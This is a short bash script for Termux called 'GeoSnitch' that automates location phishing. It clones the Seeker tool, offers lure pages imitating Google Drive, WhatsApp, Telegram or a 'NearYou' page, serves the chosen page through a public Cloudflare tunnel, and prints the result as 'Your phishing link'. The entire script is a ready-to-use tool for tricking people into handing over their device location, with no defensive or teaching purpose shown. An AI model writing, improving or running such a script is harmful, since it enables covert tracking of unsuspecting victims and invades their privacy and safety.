#!/data/data/com.termux/files/usr/bin/bash

# ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
# ┃       GeoSnitch v1.1        ┃
# ┃   by 6lackRaven (Termux)    ┃
# ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

echo -e "\n[+] Starting GeoSnitch..."
sleep 1

# Clone Seeker if it doesn't exist
if [ ! -d "$HOME/seeker" ]; then
    echo "[!] Seeker not found. Cloning..."
    git clone https://github.com/thewhiteh4t/seeker.git ~/seeker
fi

# Payload selection menu
echo -e "\n[+] Choose a payload:\n"
select payload in "NearYou (Default)" "Google Drive" "WhatsApp" "Telegram" "Exit"; do
    case $REPLY in
        1) PAYLOAD="nearby"; break ;;
        2) PAYLOAD="google_drive"; break ;;
        3) PAYLOAD="whatsapp"; break ;;
        4) PAYLOAD="telegram"; break ;;
        5) echo "[!] Exiting..."; exit 1 ;;
        *) echo "Invalid option. Try again." ;;
    esac
done

# Kill old tmux session if exists
tmux kill-session -t geosnitch 2>/dev/null

# Start tmux and run Seeker
tmux new-session -d -s geosnitch "cd ~/seeker && python3 seeker.py -t $PAYLOAD"

# Wait a bit for Seeker to boot up
sleep 4

# Start Cloudflare Tunnel and extract the URL
tmux split-window -h "cloudflared tunnel --url http://127.0.0.1:8080 2>&1 | tee ~/cf.log"
tmux select-layout tiled

# Wait a moment for URL to generate
sleep 6

# Extract and display link from log
link=$(grep -o 'https://.*\.trycloudflare\.com' ~/cf.log | head -n 1)
if [ -n "$link" ]; then
    echo -e "\n🌍 Your phishing link:\n$link"
else
    echo "[!] Could not fetch Cloudflare link. Check ~/cf.log"
fi

# Attach to tmux session
tmux attach-session -t geosnitch
